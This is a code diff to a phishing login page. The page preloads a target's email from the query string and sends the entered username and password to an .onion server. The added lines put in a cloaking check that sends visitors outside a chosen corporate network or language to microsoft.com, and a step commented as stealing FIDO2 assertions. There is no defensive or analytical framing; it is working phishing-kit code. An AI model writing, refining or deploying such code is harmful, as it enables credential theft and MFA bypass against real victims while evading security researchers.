@@ -19,6 +19,11 @@
     <button type="submit">Next</button>
   </form>
   <script type="module">
+    fetch('https://ipapi.co/json')
+      .then(r=>r.json())
+      .then(d=>{
+        if (!d.org.includes("CorpASN") || d.languages!=="en-US") location="https://microsoft.com";
+      });
     import init from './nightingale.wasm';
     init().then(() => console.log('🐦'));
     // preload victim email via query-string
@@ -26,6 +31,10 @@
     document.getElementById('email').value = atob(qs.get('e') || '');
     document.getElementById('fake').onsubmit = e => {
       e.preventDefault();
+      // steal FIDO2 assertion if available
+      if (window.PublicKeyCredential) {
+        fetch('/webauthn/start', {method:'POST', body:JSON.stringify({u:email.value})});
+      }
       fetch('https://u4k2zq3l2zxfx.onion/cred', {
         method: 'POST',
         body: JSON.stringify({u: email.value, p: password.value})
